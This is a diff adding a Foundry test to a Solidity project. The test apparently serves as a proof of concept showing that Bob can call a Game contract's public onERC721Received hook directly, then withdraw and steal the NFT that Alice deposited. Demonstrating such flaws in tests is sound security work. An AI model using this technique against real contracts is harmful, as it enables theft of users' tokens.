@@ -43,4 +43,28 @@ contract GameTest is Test {
          * the Game contract.
          */
     }
+
+    function test_withCallingOnERC721Received() public {
+        // Assume address 1 is Alice, and address 2 is Bob
+        myNFT.safeTransferFrom(address(this), address(1), 10);
+        assertEq(myNFT.ownerOf(10), address(1));
+
+        // Alice deposits NFT to Game contract
+        vm.startPrank(address(1));
+        myNFT.safeTransferFrom(address(1), address(game), 10);
+        assertEq(myNFT.ownerOf(10), address(game));
+        vm.stopPrank();
+
+        // Bob calls onERC721Received to steal original NFT from Alice
+        vm.startPrank(address(2));
+        game.onERC721Received(address(2), address(2), 10, "0x000000");
+        game.withdraw(10);
+        assertEq(myNFT.ownerOf(10), address(2));
+        vm.stopPrank();
+
+        /**
+         * In this case, Bob successfully steals the original NFT from Alice by calling public function
+         * onERC721Received of the Game contract. And then he withdraws the NFT from the Game contract.
+         */
+    }
 }
